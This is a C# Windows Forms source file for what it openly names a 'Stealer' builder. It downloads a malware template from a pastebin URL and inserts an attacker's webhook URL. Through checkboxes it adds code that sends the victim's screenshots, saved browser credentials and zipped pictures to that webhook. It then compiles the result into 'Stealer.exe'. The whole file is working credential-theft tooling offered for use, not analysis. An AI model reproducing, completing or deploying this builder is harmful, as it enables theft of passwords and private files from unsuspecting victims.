﻿using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace Simple
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            WebClient wc = new WebClient();
            string source = wc.DownloadString("https://pastebin.com/raw/S03z8jdc");
            source = source.Replace("//webhook url", textBox1.Text);

            if (checkBox1.Checked)
            {
                source = source.Replace("//screenshot", @"if (File.Exists(screenshot))
                webHook.AddAttachment(screenshot, Environment.UserName + "" screenshot.png"");");
            }
            if (checkBox2.Checked)
            {
                source = source.Replace("//browsercreds", @"if (File.Exists(browsercredpath))
                    webHook.AddAttachment(browsercredpath, Environment.UserName + "" credentials.txt"");");
            }
            if (checkBox2.Checked)
            {
                source = source.Replace("//pics", @"if (File.Exists(zipPath))
					try
					{
						webHook.AddAttachment(zipPath, Environment.UserName + "" pictures.zip"");
                    }
                    catch
                    {
                    }");
            }

            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = "Stealer.exe";
            sfd.Filter = "Exe files (Obviously) (*.exe)|*.exe";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                new Compiler(source, sfd.FileName);
            }
        }
        public class Compiler
        {
            public Compiler(string sourceCode, string savePath)
            {
                string[] referencedAssemblies = new string[] { "System.dll", "System.Windows.Forms.dll", "System.Net.dll", "System.Drawing.dll", "System.Management.dll", "System.IO.dll", "System.IO.compression.dll", "System.IO.compression.filesystem.dll", "System.Core.dll", "System.Security.dll", "System.Net.Http.dll" };

                Dictionary<string, string> providerOptions = new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } };

                string compilerOptions = "/target:winexe /platform:anycpu /optimize+";

                using (CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider(providerOptions))
                {
                    CompilerParameters compilerParameters = new CompilerParameters(referencedAssemblies)
                    {
                        GenerateExecutable = true,
                        GenerateInMemory = false,
                        OutputAssembly = savePath, // output path
                        CompilerOptions = compilerOptions,
                        TreatWarningsAsErrors = false,
                        IncludeDebugInformation = false,
                    };

                    CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, sourceCode); // source.cs
                    if (compilerResults.Errors.Count > 0)
                    {
                        foreach (CompilerError compilerError in compilerResults.Errors)
                        {
                            MessageBox.Show(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
                                compilerError.Line, compilerError.Column, compilerError.FileName));
                        }

                    }
                    else
                    {
                        MessageBox.Show("Compile Successful!");
                    }
                    return;
                }
            }
        }

       
    }
}
